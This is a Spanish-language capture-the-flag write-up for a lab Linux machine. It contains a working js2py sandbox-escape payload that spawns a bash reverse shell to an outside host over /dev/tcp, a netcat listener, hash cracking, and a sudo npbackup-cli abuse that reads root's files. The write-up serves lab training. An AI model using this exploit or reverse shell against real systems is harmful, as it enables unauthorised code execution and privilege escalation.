
Dificultad: Easy
IP: 10.10.11.82
OS: Linux 
# Escaneo

```shell
ping 10.10.11.82
```

Recibimos un TTL de 63, al ser proximo a 64, sabemos que es Linux

### Nmap

```shell
sudo nmap -p- 10.10.11.82 -vvv --min-rate 5000 -n -Pn -oG ports
```

![[Pasted image 20251018104242.png]]

Vemos que tenemos un servicio http (seguramente una pagina Web), antes haremos un escaneo mas especifico:

```shell
sudo nmap -sCV -T5 -vvv 10.10.11.82 -p22,8000 -oN ExactScan 
```

![[Pasted image 20251018105129.png]]

# Reconocimiento

Visitamos la Pagina:

![[Pasted image 20251018105230.png]]

Damos click en download app, recibimos un web.zip, tenemos que descomprimirlo:

![[Pasted image 20251018105659.png]]

En el archivo vemos un app.py, en el que encontramos que este codigo está usando js2py, lo cual es usado para convertir codifo js a python, y ejecutarlo.

![[Pasted image 20251018110029.png]]

Como podemos ver en el archivo requirements.txt js2py está usando la version 0.74:

![[Pasted image 20251018110355.png]]

Si buscamos esta version en internet de js2py, encontramos un SandBox Bypass, lo que nos permite ejecutar comandos en el servidor (RCE):

![[Pasted image 20251018110528.png]]

Pero por ahora esto no nos sirve de nada ya que esta es una aplicacion en nuestro propio sistema, pero esto nos puede estar dando una pista de por donde podemos entrar.


Cuando entramos a la pagina y nos loggeamos, nos encontramos con justamente un editor e interpretador de código:

![[Pasted image 20251018110837.png]]


Como vimos antes, seguramente se use una version vulnerable de js2py, encontramos que para explotar esta vulnerabilidad vamos a usar el siguiente codigo js en la pagina:

```js
let cmd = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.23/1234 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

Pero antes de correr este codigo, debemos iniciar una escucha con netcat:

```shell
sudo nc -lvnp 1234
```

Ya lo podemos ejecuta peresionando "RUN CODE", y obtenemos acceso:

![[Pasted image 20251018111635.png]]

Encontramos una base de datos que seguramente contiene usuarios:

![[Pasted image 20251018112046.png]]

Crackeamos todos los hashes usando hashcat

![[Pasted image 20251018112234.png]]

![[Pasted image 20251018112256.png]]

Vemos que el hash corresponde al usuario marco, mismo usuario que encontramos en la maquina, por lo que vamos a elevar nuestro privilegios:

![[Pasted image 20251018112453.png]]
# Privilege Scalation

Vamos a ver que podemos ejecutar como sudo:

```shell
sudo -l
```

![[Pasted image 20251018114643.png]]

Vemos que podemos ejecutar npbackup-cli como sudo, en internet encontramos que es una herramienta que hace backups de un servidor y lo almacena en un repositorio

```shell
sudo npbackup-cli 
```

Vemos que recibimos el siguiente error:

![[Pasted image 20251018115214.png]]

En nuestro propio directorio encontramos un archivo llamado npbackup.conf, el cual nos puede servir como plantilla para nuestro ataque, pero tenemos que saber como podemos especificar este archivo, buscando un poco en la ayuda del comando `sudo npbackup-cli` encontramos el parametro -c para especificar el archivo de configuración:

```shell
sudo npbackup-cli -c npbackup.conf
```

![[Pasted image 20251018121522.png]]

Nos dice que hace falta especificar la operacion a usar, ademas nos recomienda revisar el manual de ayuda, en el que vemos diferentes opciones:

![[Pasted image 20251018123732.png]]

Vemos la opcion de backup, la cual nos interesa ya que podemos hacer un backup del directorio de root `/root`, tambien nos interesa la opcion -f por si acaso ya hay un backup que justo se hizo en ese momento, forzarlo a que sobre escriba ese:

Ahora solo tendriamos que modificar el archivo npbackup.conf, de tal forma que quede así:

![[Pasted image 20251018151910.png]]


D eesta forma ahora el backup se va a hacer de la carpeta root, antes intenté cambiar la uri por una ruta hacia el direcotrio en el que estaba pero no salio del todo bien ya que era una carpeta solo legible por root, por llo que tuve que buscar una alternativa, recordemos que los snapshots son basicamente diferentes backups en diferentes momentos, el comando `--dump` nos ayuda a dumpear un archivo especifico de el ultimo snapshot.

Por lo que primero debemos crear el backup con el nuevo archivo de npbackup.conf:

```shell
sudo npbackup -c npbackup2.conf --dump /root/root.txt
```




# Leccion de esta maquina


- Estaba confundiendo los snapshots como algo diferente a los backups, pero hay que recordar que son basicamente lo mismo, y npbackup es especificamente para hacer snapshots (backups cada cierto tiempo), es como cuando hago snapshots en vmware.

